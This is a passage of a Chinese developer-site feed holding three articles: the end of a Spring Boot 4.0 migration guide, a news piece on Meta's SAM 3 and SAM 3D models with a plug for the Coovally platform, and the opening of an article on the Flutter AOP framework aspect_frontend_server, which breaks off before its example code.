<li><strong>空值安全注解替换</strong>：原 <code>javax.annotations.NonNull</code>、<code>org.springframework.lang.Nullable</code> 需替换为 JSpecify 的 <code>@NonNull</code>/<code>@Nullable</code>，IDE（如 IntelliJ IDEA 2024+）可提供编译期空值风险提示。</li>
<li><strong>HTTP 客户端迁移</strong>：使用 OpenFeign 的项目，需替换为 <code>@HttpServiceClient</code>，注意调整接口定义与调用逻辑（如请求参数注解、异常处理）。</li>
</ul>
<h4 data-id="heading-14">3. 分阶段升级路径</h4>
<ol>
<li><strong>现有 3.x 项目</strong>：先升级至 3.5.x 版本，解决编译错误与依赖冲突，熟悉 4.0 预览特性（如模块化配置、虚拟线程测试）。</li>
<li><strong>环境适配</strong>：在测试环境部署 3.5.x 项目，验证 Tomcat/Jetty 容器兼容性、Java 21 运行稳定性。</li>
<li><strong>4.0 迁移</strong>：待 3.5.x 项目稳定后，基于官方迁移指南（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fspring-projects%2Fspring-boot%2Fwiki" target="_blank" title="https://github.com/spring-projects/spring-boot/wiki" ref="nofollow noopener noreferrer">参考官方 Wiki</a>）升级至 4.0，重点测试原生镜像编译、API 版本控制等新特性。</li>
</ol>
<h3 data-id="heading-15">总结</h3>
<p>Spring Boot 4.0 是一次 “面向云原生的全方位升级”：通过虚拟线程、GraalVM 原生镜像实现性能突破，通过原生 HTTP 客户端、API 版本控制简化开发，通过模块化重构提升架构灵活性。对于开发者而言，需关注 Java 版本、Web 容器与依赖库的适配，遵循 “先 3.5.x 过渡，再 4.0 迁移” 的策略，以最小成本享受新版本红利。</p>
<p>未来，随着 Jakarta EE 生态的持续演进与 Spring 生态的不断优化，Spring Boot 4.0 有望成为云原生 Java 应用的 “新一代标准基座”，尤其适合微服务、Serverless 等高性能、低资源消耗的场景。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[分割万事万物的AI，再进化！Meta SAM 3 来了，支持中文提示词！]]></title>    <link>https://juejin.cn/post/7574724406305439794</link>    <guid>https://juejin.cn/post/7574724406305439794</guid>    <pubDate>2025-11-21T02:42:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574724406305439794" data-draft-id="7574651025728684070" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="分割万事万物的AI，再进化！Meta SAM 3 来了，支持中文提示词！"/> <meta itemprop="keywords" content="算法,计算机视觉,深度学习"/> <meta itemprop="datePublished" content="2025-11-21T02:42:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CoovallyAIHub"/> <meta itemprop="url" content="https://juejin.cn/user/2461151071843739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            分割万事万物的AI，再进化！Meta SAM 3 来了，支持中文提示词！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2461151071843739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CoovallyAIHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T02:42:28.000Z" title="Fri Nov 21 2025 02:42:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>深夜，Meta 又一次给 AI 视觉领域丢下重磅炸弹——<strong>SAM 3（Segment Anything Model 3）与 SAM 3D 全面发布！</strong></p>
<p><strong>不仅模型开放权重，连推理代码、数据集、体验平台都一次性放出，可谓“真·全家桶”。</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ba5439d8c7b48c2a9f187b9007e6a35~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297748&amp;x-signature=%2F%2F9EvTOHbkXXp1UuXEtpBaJYo1w%3D" alt="图片" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63d741307ce64c07bb8107f5723e2414~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297748&amp;x-signature=ryYJ3q6poNLAITLlSXZe6s%2FG7z0%3D" alt="图片" loading="lazy"/></p>
<p><strong>这意味着什么？</strong></p>
<p>如果说早期的 SAM 1、SAM 2 让我们看到了“分割一切”的可能性，那么现在，Meta 想让机器做到更多：</p>
<p>不仅要分割一切，还要从一张图片里重建整个 3D 世界。</p>
<h2 data-id="heading-0"><strong>SAM 3</strong></h2>
<p>和 SAM 3D 关注 3D 不同，SAM 3 是新一代通用分割大模型，能力全面提升。</p>
<p>之前我们介绍过 SAM3 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkzOTg3NTAyNA%3D%3D%26mid%3D2247491580%26idx%3D2%26sn%3D8f93d4a62ae3f194f47b0d9808b26d9a%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkzOTg3NTAyNA==&amp;mid=2247491580&amp;idx=2&amp;sn=8f93d4a62ae3f194f47b0d9808b26d9a&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ICLR 2026 惊现 SAM 3，匿名提交，实现“概念分割”，CV领域再迎颠覆性突破？</a>通过引入可提示概念分割（promptable concept segmentation） 模型能够根据文本提示或示例图像提示，找到并分割某个概念的所有实例。</p>
<p>这次发布让我们看到，它不仅可以分割，还可以</p>
<p><strong>检测 + 分割 + 跟踪</strong></p>
<p>覆盖 <strong>图像 &amp; 视频</strong></p>
<p>并且支持 <strong>多种提示方式：</strong></p>
<p>✔ 文本提示（Text Prompt）</p>
<p>✔ 示例提示（Exemplar Prompt）</p>
<p>✔ 视觉提示（Visual Prompt）</p>
<p>“Promptable Concept Segmentation”——概念级分割，这让 SAM 3 能识别大量新概念，并支持开放词汇。</p>
<p>为了评估模型在大词汇量情况下的检测与分割能力，Meta 还构建了 SA-Co（Segment Anything with Concepts）基准。与以往基准相比，SA-Co 涵盖了规模更大的概念词汇，挑战性显著提高。</p>
<p>在 Meta 发布的新 benchmark SA-Co 上，SAM 3 相比现有模型做到：</p>
<p>图像 + 视频概念分割性能提升一倍以上</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2cb5d027341147a2b78c430383ba3370~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297748&amp;x-signature=Iu8oB%2FcIBwyQIoQ9vVDEF8Nk8Rc%3D" alt="图片" loading="lazy"/></p>
<p>用户偏好测试中，SAM 3 的结果是 OWLv2 的 3 倍</p>
<p>单图像推理 30ms 内完成 100+ 对象检测与分割</p>
<p>简而言之，速度快、效果强、能力广。</p>
<p>对于开发者和研究者而言，像Coovally 这样的AI平台已经集成了1000+预训练模型，您可以直接调用使用，极大简化了开发流程。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab4bd1d5bbbf408fb1846ebb26167145~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297748&amp;x-signature=Kltx54xIyeVESD5LSNc7GkBLppE%3D" alt="图片" loading="lazy"/></p>
<p>不仅如此，您也可以直接在Coovally平台上上传自己的模型和数据进行训练，享受一站式的AI开发体验。</p>
<p><strong>！！点击下方链接，立即体验Coovally！！</strong></p>
<p><strong>平台链接：</strong> <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.coovally.com" target="_blank" title="https://www.coovally.com" ref="nofollow noopener noreferrer">www.coovally.com</a></strong></p>
<h2 data-id="heading-1"><strong>SAM 3D</strong></h2>
<p>SAM 3D 是 SAM 家族最新成员，一个真正将2D 分割能力延伸到 3D 理解的里程碑模型。</p>
<p>如果说 SAM 是“让所有人都能对图像进行分割”的起点，那么 SAM 3D 则是在此基础上迈向“人人皆可 3D”时代的重要一步：它不仅能识别物体、人体、场景，还能把普通 2D 图片“长成”完整的 3D 结构。</p>
<p>它包含两个子模型：</p>
<ul>
<li><strong>SAM 3D Objects</strong></li>
</ul>
<p>SAM 3D Objects 专注于通用物体与场景的3D重建，能从一个静止图像中还原物体的详细形状、纹理和空间布局。</p>
<p><strong>数据引擎革命：</strong> 创建3D真值通常需要3D艺术家手动制作，费时费力。SAM 3D的创新在于，它构建了一个高效的“人机循环”数据标注引擎：</p>
<p>利用一系列模型自动为海量图片生成多个3D网格候选。让标注者（而非创建者）对AI生成的选项进行评分和排序，这是一个门槛更低、效率更高的任务。将最棘手的案例路由给专业的3D艺术家处理，以填补数据盲区。</p>
<p>通过这一引擎，Meta以前所未有的规模为近100万张真实世界图像标注了3D信息，生成了约314万个模型参与生成的网格。</p>
<p><strong>训练范式创新：</strong> 借鉴大语言模型的成功经验，SAM 3D采用了“预训练-后训练” 的全新食谱。</p>
<p>在大量合成的3D资产上学习基础3D先验。利用上述数据引擎产出的真实世界数据，对模型进行“对齐”训练，从而跨越从合成数据到真实数据的鸿沟。</p>
<p>模型与数据引擎相互促进，形成一个不断自我改进的正向飞轮。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3adeb28cc3d142aaae59ad3f6b765c95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297748&amp;x-signature=qL6GxcCRHaiY4nWF200VoCbwLT0%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d57fedd753a048d8bd25cfb1b6001fd4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297748&amp;x-signature=wa08MP2DQ0Ybjo7GxoB0en03qrQ%3D" alt="图片" loading="lazy"/></p>
<p>这些只需几年之前还属于研究级能力，如今被 Meta 做成开源工具。</p>
<ul>
<li><strong>SAM 3D Body</strong></li>
</ul>

<ul>
<li><strong>海量高质量数据：</strong> 基于从数十亿图像中通过自动化引擎挖掘出的约800万张高质量图片进行训练，这些图片涵盖了罕见姿势和复杂拍摄条件，使模型对遮挡、奇异姿态和多样着装具有惊人的鲁棒性。</li>
<li><strong>可提示的交互设计：</strong> 模型支持通过分割掩码、2D关键点等交互输入来引导预测，让用户拥有更大的控制权。</li>
<li><strong>全新的参数化人体模型MHR：</strong> 本次开源还包括MHR模型，它将人体的骨骼结构与软组织形状分离，提供了更强的可解释性，并已应用于Meta的Codec Avatars等核心技术。</li>
</ul>
<p>Meta 强调，这两个模型在各类 3D benchmark 上都达到了 SOTA（业界领先）性能。</p>
<p>一句话总结 SAM 3D：</p>
<p>把普通人拍的 2D 照片，变成可用于 AR/VR、影视、游戏、机器人和科学研究的 3D 数据。</p>
<p>Meta 还构建了一个包含约 800 万张图像的高质量训练数据集，使其能够应对遮挡、罕见姿态和各种服装，并在多个 3D 基准测试中均超越了以往的模型。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/172476776491409cb619530be00fad4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297748&amp;x-signature=2izCXy8eYW9oQwIJjR91CEKSJic%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>这次为什么这么重要？</strong></h2>
<p>从 SAM（2D 分割）到 SAM 3（通用检测/分割/跟踪）到 SAM 3D（3D 重建平台）</p>
<p>Meta 正在构建一个覆盖：</p>
<p>「2D 识别 → 3D 理解 → 视频跟踪 → 多模态推理」的完整视觉 AI 基础设施。</p>
<p>对于整个 AI 视觉生态的意义包括：未来的 AI 应用不再需要从零训练检测/分割模型</p>
<p>3D 生成、AR/VR、机器人将获得标准化 3D 感知能力视频编辑、特效制作将彻底简化。学术界获得了统一的开放数据与 benchmark工业检测、农业、安防、自动驾驶、小样本学习等领域都能直接接入。</p>
<p>一句话，这是视觉 AI 的一次“地基级”升级。</p>
<h2 data-id="heading-3"><strong>总结</strong></h2>
<p>当我们还在讨论“能不能分割一切”时，Meta 已经把问题升级为——“能不能从一张图片里重建世界？”</p>
<p>SAM 3D 与 SAM 3 的同步发布，让这个问题第一次变得现实和可实验。</p>
<p>未来一两年，围绕它们会诞生非常多的产业级创新。我相信这将是视觉 AI 赛道的一个重要里程碑。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter Aop 面向切面编程 aspect_frontend_server 前世今生]]></title>    <link>https://juejin.cn/post/7574718964044480562</link>    <guid>https://juejin.cn/post/7574718964044480562</guid>    <pubDate>2025-11-21T02:30:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574718964044480562" data-draft-id="7574651025728536614" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter Aop 面向切面编程 aspect_frontend_server 前世今生"/> <meta itemprop="keywords" content="开源"/> <meta itemprop="datePublished" content="2025-11-21T02:30:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="孤鸿玉"/> <meta itemprop="url" content="https://juejin.cn/user/3738794874900295"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter Aop 面向切面编程 aspect_frontend_server 前世今生
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3738794874900295/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    孤鸿玉
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T02:30:07.000Z" title="Fri Nov 21 2025 02:30:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>面向切面编程在java中是很常见的运用，它可以很容易的在不改动已有代码的情况下加入自己的代码逻辑。
一些jdk核心代码，我们没有办法直接编辑，也可以通过这种方式进行修改。在Java中做到这些很容易，因为Java有一整套反射机制。</p>
<p>在Flutter中，做到这些就有些困难，为了更好的性能，Flutter中的Dart阉割了它的反射功能。</p>
<p>在过往的时间里也出现了一些可以用来做Flutter Aop的工具：</p>
<h4 data-id="heading-0">1.<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FXianyuTech%2Faspectd" target="_blank" title="https://github.com/XianyuTech/aspectd" ref="nofollow noopener noreferrer">XianyuTech/<em>aspectd</em></a></h4>
<p>最早是闲鱼团队发起的，但是已经很久没有更新，SDK支持版本仍然停留在2.5。</p>
<h4 data-id="heading-1">2.<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FLianjiaTech%2FBeike_AspectD" target="_blank" title="https://github.com/LianjiaTech/Beike_AspectD" ref="nofollow noopener noreferrer">Beike_<em>AspectD</em></a></h4>
<p>贝壳团队在Aspectd基础上进行了改造和适配，但最新SDK也只支持到3.10.5</p>
<h4 data-id="heading-2">3.<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsensorsdata%2Fsa_flutter_aspectd" target="_blank" title="https://github.com/sensorsdata/sa_flutter_aspectd" ref="nofollow noopener noreferrer">sa_flutter_<em>aspectd</em></a></h4>
<p>神策团队基于aspectd做的一些改造，专门为它们信息采集做服务，但更新记录只停留在2022年。</p>
<h4 data-id="heading-3">4.<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flancexin%2Faspect_frontend_server" target="_blank" title="https://github.com/lancexin/aspect_frontend_server" ref="nofollow noopener noreferrer">aspect_frontend_server</a></h4>
<p>它是我在得知aspectd不支持2.5后续版本后，借鉴了aspectd代码，并重写的一套Flutter Aop面向切面编程框架，从2021年开始更新一直至今，已经支持最新的flutter 3.38.1。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flancexin%2Faspect_frontend_server" target="_blank" title="https://github.com/lancexin/aspect_frontend_server" ref="nofollow noopener noreferrer">aspect_frontend_server</a>虽然是借鉴了aspectd代码的代码，但可以说是完全重写，它去掉了很多原本aspectd中的功能，只保留了最基本的aop功能，也就是拦截某个方法的运行，可以在它运行的前后插入自己的运行逻辑。设置上完全替换到原有逻辑。</p>
<h3 data-id="heading-4"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flancexin%2Faspect_frontend_server" target="_blank" title="https://github.com/lancexin/aspect_frontend_server" ref="nofollow noopener noreferrer">aspect_frontend_server</a>的集成方法也很简单。只需要替换到原本flutter中的frontend_server_aot.dart.snapshot文件，不需要引入任何额外的库。</h3>
<p>通过<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flancexin%2Faspect_frontend_server" target="_blank" title="https://github.com/lancexin/aspect_frontend_server" ref="nofollow noopener noreferrer">aspect_frontend_server</a>写入一个注入例子也很简单，下面是一个简单的例子：</p>
<p>在mian.dart文件中我们写入：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'inject.dart'</span>;
</code></pre>
<p>在injiect.dart中写入：</p>
